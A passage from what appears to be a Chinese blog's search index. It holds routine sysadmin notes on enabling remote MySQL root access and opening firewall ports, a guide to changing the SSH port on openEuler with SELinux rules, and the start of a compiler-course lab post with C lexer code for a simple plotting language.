user;</code></pre><p>把<code>root</code>用户的<code>host</code>列修改为<code>%</code>（<code>Host=&#39;%&#39;</code>允许任何地址）</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">update user set Host&#x3D;&#39;%&#39; where User&#x3D;&#39;root&#39;;</code></pre><p>刷新立即生效</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">flush privileges;</code></pre><h4 id="3-打开防火墙端口"><a href="#3-打开防火墙端口" class="headerlink" title="3.打开防火墙端口"></a>3.打开防火墙端口</h4><p>如仍无法连接，检查防火墙状态<br>开放端口（mysql默认连接端口是3306）</p><pre class="language-bash" data-language="bash"><code class="language-bash">firewall-cmd <span class="token parameter variable">--state</span>   <span class="token comment">#查看防火墙状态</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --list-ports   <span class="token comment">#查看防火墙所有开放的端口</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">3306</span>/tcp <span class="token parameter variable">--permanent</span>   <span class="token comment"># 开放3306端口</span>firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --remove-port<span class="token operator">=</span><span class="token number">3306</span>/tcp <span class="token parameter variable">--permanent</span>   <span class="token comment">#关闭3306端口</span>firewall-cmd <span class="token parameter variable">--reload</span>   <span class="token comment"># 配置立即生效</span></code></pre><p><strong>[极度不建议]</strong> 关闭防火墙</p><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl stop firewalld.service</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> MySQL </tag>
            
            <tag> CentOS </tag>
            
            <tag> openEuler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openeuler系统修改SSH默认端口号</title>
      <link href="/2024/08/23/openeuler-xi-tong-xiu-gai-ssh-mo-ren-duan-kou-hao/"/>
      <url>/2024/08/23/openeuler-xi-tong-xiu-gai-ssh-mo-ren-duan-kou-hao/</url>
      
        <content type="html"><![CDATA[<p>记录一下openEuler系统修改SSH端口操作命令，省得日后再查。</p><span id="more"></span><h1 id="一、修改前备份SSH配置文件"><a href="#一、修改前备份SSH配置文件" class="headerlink" title="一、修改前备份SSH配置文件"></a>一、修改前备份SSH配置文件</h1><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">cp</span> /etc/ssh/sshd_config /etc/ssh/sshd_config.bak</code></pre><h1 id="二、编辑SSH文件"><a href="#二、编辑SSH文件" class="headerlink" title="二、编辑SSH文件"></a>二、编辑SSH文件</h1><p>使用文本编辑器（<code>vi</code>、<code>vim</code>、<code>nano</code> 等）打开<code>/etc/ssh/sshd_config</code>文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/ssh/sshd_config</code></pre><p>在文件中找到有关端口号的行并修改所需端口号。<br>默认情况下该行为：</p><pre class="language-sshd_config" data-language="sshd_config"><code class="language-sshd_config">#Port 22</code></pre><h1 id="三、保存并关闭文件"><a href="#三、保存并关闭文件" class="headerlink" title="三、保存并关闭文件"></a>三、保存并关闭文件</h1><p>保存更改并关闭编辑器。<br>（1）如果使用的是 <code>nano</code>，可以按 <code>Ctrl + O</code>，然后按 <code>Enter</code> 保存，最后按 <code>Ctrl + X</code> 退出。<br>（2）如果使用的是 <code>vim</code>，可以按 <code>ESC</code>，然后按 <code>：wq</code> 保存退出。</p><h1 id="四、放行防火墙端口"><a href="#四、放行防火墙端口" class="headerlink" title="四、放行防火墙端口"></a>四、放行防火墙端口</h1><p>放行刚刚修改的SSH端口。如<code>22</code>端口，执行下面命令：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">22</span>/tcp <span class="token parameter variable">--permanent</span></code></pre><p>重启防火墙，使修改内容生效</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--reload</span></code></pre><h1 id="五、检查SELinux策略"><a href="#五、检查SELinux策略" class="headerlink" title="五、检查SELinux策略"></a>五、检查SELinux策略</h1><p><strong>更改 <code>SELinux</code> 策略以允许 SSHD 在新端口上监听</strong></p><p>首先，安装 <code>policycoreutils-python-utils</code>（或 <code>policycoreutils-python</code>，取决于你的发行版）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> policycoreutils-python-utils</code></pre><p>然后添加一个新的策略规则</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> semanage port <span class="token parameter variable">-a</span> <span class="token parameter variable">-t</span> ssh_port_t <span class="token parameter variable">-p</span> tcp <span class="token number">22</span></code></pre><p>这将允许 SSHD 服务在 <code>TCP</code> 端口 <code>22</code> 上运行</p><p>检查端口 22 是否已经正确地被分配给了 SSH</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> semanage port <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> ssh_port_t</code></pre><p>重新启动 SSHD 服务</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart sshd</code></pre><p>直接关闭<code>SELinux</code>重启sshd<em><strong>（不建议）</strong></em></p><p>暂时关闭<code>SELinux</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> setenforce <span class="token number">0</span></code></pre><p>重新启动 SSHD 服务并重新启用 <code>SELinux</code> 强制模式</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart sshd<span class="token function">sudo</span> setenforce <span class="token number">1</span></code></pre><p>检查 SELinux 状态和日志</p><pre class="language-bash" data-language="bash"><code class="language-bash">getenforce</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> openEuler </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理实验——简单函数绘图语言的解释器</title>
      <link href="/2020/12/11/bian-yi-yuan-li-shi-yan-jian-dan-han-shu-hui-tu-yu-yan-de-jie-shi-qi/"/>
      <url>/2020/12/11/bian-yi-yuan-li-shi-yan-jian-dan-han-shu-hui-tu-yu-yan-de-jie-shi-qi/</url>
      
        <content type="html"><![CDATA[<p>编译原理布置了一个巨复杂的作业，完成一个简单函数绘图语言的解释器，秉承某电实验班的<del>开源</del>精神~在此记录一下方便后人。<br><img src="/images/2020/12/11/d9929fc5-6c27-406d-a0b7-a4e209686503.png"></p><span id="more"></span><p><img src="/images/2020/12/11/0c038523-aae6-4a04-8998-0682b2fd2fb5.png"><br>运行环境：Visual Studio 2019<br>简单函数绘图语言的解释器可分为：词法分析器、语法分析器、语义分析器三部分实现。代码组织框架如下图所示：<br><img src="/images/2020/12/11/8a1131c9-00e4-4c4a-9f74-994aeb3c85cf.png"></p><h3 id="1、词法分析器"><a href="#1、词法分析器" class="headerlink" title="1、词法分析器"></a>1、词法分析器</h3><p><strong>测试文本：</strong><br><strong>test_scanner.txt</strong></p><pre class="language-txt" data-language="txt"><code class="language-txt">ORIGIn IS (350, 220);  rot is 0;scale is (50, 100);FOR T FROM 0 TO 2*PI STEP PI/500 DRAW(cos(T),sin(T));scale is (100, 100);FOR T FROM 0 TO 2*PI STEP PI/500 DRAW(cos(2*T),sin(T));</code></pre><h4 id="scanner-h"><a href="#scanner-h" class="headerlink" title="scanner.h"></a>scanner.h</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">SCANNER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SCANNER_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span> <span class="token comment">//ctype.h是C标准函数库中的头文件，定义了一批C语言字符分类函数，用于测试字符是否属于特定的字符类别，</span></span><span class="token comment">//如字母字符、控制字符等等。</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdarg.h></span><span class="token comment">//让函数可以接收可变参数</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span><span class="token comment">//记号类别枚举</span><span class="token punctuation">&#123;</span>ORIGIN<span class="token comment">/* 0 */</span><span class="token punctuation">,</span> SCALE<span class="token comment">/* 1 */</span><span class="token punctuation">,</span> ROT<span class="token comment">/* 2 */</span><span class="token punctuation">,</span> IS<span class="token comment">/* 3 */</span><span class="token punctuation">,</span> TO<span class="token comment">/* 4 */</span><span class="token punctuation">,</span> STEP<span class="token comment">/* 5 */</span><span class="token punctuation">,</span> DRAW<span class="token comment">/* 6 */</span><span class="token punctuation">,</span> FOR<span class="token comment">/* 7 */</span><span class="token punctuation">,</span> FROM<span class="token comment">/* 8 */</span><span class="token punctuation">,</span><span class="token comment">//保留字</span>T<span class="token comment">/* 9 */</span><span class="token punctuation">,</span><span class="token comment">//参数</span>SEMICO<span class="token comment">/* 10 */</span><span class="token punctuation">,</span> L_BRACKET<span class="token comment">/* 11 */</span><span class="token punctuation">,</span> R_BRACKET<span class="token comment">/* 12 */</span><span class="token punctuation">,</span> COMMA<span class="token comment">/* 13 */</span><span class="token punctuation">,</span><span class="token comment">//分层符号</span>PLUS<span class="token comment">/* 14 */</span><span class="token punctuation">,</span> MINUS<span class="token comment">/* 15 */</span><span class="token punctuation">,</span> MUL<span class="token comment">/* 16 */</span><span class="token punctuation">,</span> DIV<span class="token comment">/* 17 */</span><span class="token punctuation">,</span> POWER<span class="token comment">/* 18 */</span><span class="token punctuation">,</span><span class="token comment">//运算符</span>FUNC<span class="token comment">/*19 */</span><span class="token punctuation">,</span><span class="token comment">//函数</span>CONST_ID<span class="token comment">/* 20 */</span><span class="token punctuation">,</span><span class="token comment">//常数</span>NONTOKEN<span class="token comment">/* 21 */</span><span class="token punctuation">,</span><span class="token comment">//空记号，标记源程序文件的结束</span>ERRTOKEN<span class="token comment">/* 22 */</span><span class="token comment">//出错记号，标记非法输入</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">double</span><span class="token punctuation">(</span><span class="token operator">*</span>MathFuncPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//MathFuncPtr代表一个指向返回double值并带有一个double形参的函数的指针的类型</span><span class="token keyword">struct</span> <span class="token class-name">Token</span><span class="token punctuation">&#123;</span>Token_Type type<span class="token punctuation">;</span><span class="token comment">//记号类别</span><span class="token keyword">char</span> <span class="token operator">*</span> lexeme<span class="token punctuation">;</span><span class="token comment">//属性，字符串，指向char类型的指针</span><span class="token keyword">double</span> value<span class="token punctuation">;</span><span class="token comment">//属性，常数的值，double型</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token operator">*</span>FuncPtr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//属性，函数指针，代表一个指向返回double值并带有一个double形参的函数的指针的类型</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> Token TokenTab<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token comment">//符号表内容</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> CONST_ID<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"PI"</span><span class="token punctuation">,</span> <span class="token number">3.1415926</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> CONST_ID<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"E"</span><span class="token punctuation">,</span><span class="token number">2.71828</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> T<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"T"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"SIN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>sin <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"COS"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>cos <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"TAN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>tan <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"LN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>log <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"EXP"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>exp <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FUNC<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"SQRT"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span>sqrt <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> ORIGIN<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"ORIGIN"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> SCALE<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"SCALE"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> ROT<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"ROT"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> IS<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"IS"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FOR<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"FOR"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> FROM<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"FROM"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> TO<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"TO"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> STEP<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"STEP"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> DRAW<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"DRAW"</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">extern</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">;</span><span class="token comment">//跟踪记号所在源文件行号</span><span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">InitScanner</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化词法分析器</span><span class="token keyword">extern</span> Token <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取记号函数</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭词法分析器</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span></code></pre><h4 id="scanner-cpp"><a href="#scanner-cpp" class="headerlink" title="scanner.cpp"></a>scanner.cpp</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"scanner.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TOKEN_LEN</span> <span class="token expression"><span class="token number">100</span></span><span class="token comment">//记号最大长度</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable<span class="token operator">:</span> <span class="token number">4996</span><span class="token punctuation">)</span></span></span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">;</span><span class="token comment">//源文件行号</span><span class="token keyword">static</span> FILE <span class="token operator">*</span>InFile<span class="token punctuation">;</span><span class="token comment">//输入文件流</span><span class="token keyword">static</span> <span class="token keyword">char</span> TokenBuffer<span class="token punctuation">[</span>TOKEN_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//记号字符缓冲</span><span class="token comment">//初始化词法分析器</span><span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">InitScanner</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>FileName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>LineNo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//行号</span>InFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//只读形式打开文件</span><span class="token keyword">if</span> <span class="token punctuation">(</span>InFile <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//打开成功</span><span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//打开失败</span><span class="token punctuation">&#125;</span><span class="token comment">//关闭词法分析器</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>InFile <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token function">fclose</span><span class="token punctuation">(</span>InFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭文件</span><span class="token punctuation">&#125;</span><span class="token comment">//从输入源程序（流）读字符</span><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> Char <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span>InFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//逐个字符读</span><span class="token keyword">return</span> <span class="token function">toupper</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//全部转换为大写，然后return</span><span class="token punctuation">&#125;</span><span class="token comment">//将预读字符退回源程序（流）</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">BackChar</span><span class="token punctuation">(</span><span class="token keyword">char</span> Char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token function">ungetc</span><span class="token punctuation">(</span>Char<span class="token punctuation">,</span> InFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//加入字符到记号缓冲区</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">AddCharTokenString</span><span class="token punctuation">(</span><span class="token keyword">char</span> Char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> TokenLength <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>TokenLength <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//数组越界</span>TokenBuffer<span class="token punctuation">[</span>TokenLength<span class="token punctuation">]</span> <span class="token operator">=</span> Char<span class="token punctuation">;</span><span class="token comment">//写入字符到缓冲区</span>TokenBuffer<span class="token punctuation">[</span>TokenLength <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token comment">//加入字符串结束标志“\0”</span><span class="token punctuation">&#125;</span><span class="token comment">//请空记号缓冲区</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">EmptyTokenString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">memset</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> TOKEN_LEN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//判断记号是否在记号表中</span><span class="token keyword">static</span> Token <span class="token function">JudgeKeyToken</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>IDString<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> loop<span class="token punctuation">;</span><span class="token comment">//sizeof(TokenTab)L:表示这个数组一共占了多少字节数;sizeof(TokenTab[0])：表示一个元素所占的字节数,两者相除，表述数组中一共有多少个元素</span><span class="token keyword">for</span> <span class="token punctuation">(</span>loop <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> loop <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TokenTab<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TokenTab<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> loop<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//遍历TokenTab表</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>TokenTab<span class="token punctuation">[</span>loop<span class="token punctuation">]</span><span class="token punctuation">.</span>lexeme<span class="token punctuation">,</span> IDString<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">return</span> TokenTab<span class="token punctuation">[</span>loop<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//判断在字符表中就返回该记号</span><span class="token punctuation">&#125;</span>Token errortoken<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>errortoken<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先将errortoken置空</span>errortoken<span class="token punctuation">.</span>type <span class="token operator">=</span> ERRTOKEN<span class="token punctuation">;</span><span class="token comment">//然后填入出错记号</span><span class="token keyword">return</span> errortoken<span class="token punctuation">;</span><span class="token comment">//返回出错记号</span><span class="token punctuation">&#125;</span><span class="token comment">//获得一个记号</span><span class="token keyword">extern</span> Token <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Token token<span class="token punctuation">;</span><span class="token keyword">char</span> Char<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>token<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//token置空</span><span class="token function">EmptyTokenString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//清空记号缓冲区</span>token<span class="token punctuation">.</span>lexeme <span class="token operator">=</span> TokenBuffer<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token comment">//此循环用来过滤掉源程序中的空格、TAB、回车等分隔符，文件结束返回空记号</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从源程序读字符</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token comment">//读出错</span><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> NONTOKEN<span class="token punctuation">;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'\n'</span><span class="token punctuation">)</span>LineNo<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//行号+1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//遇到空格该记号肯定已经完成，退出循环</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果不是上面的那些分隔符，就先加入缓冲区</span><span class="token 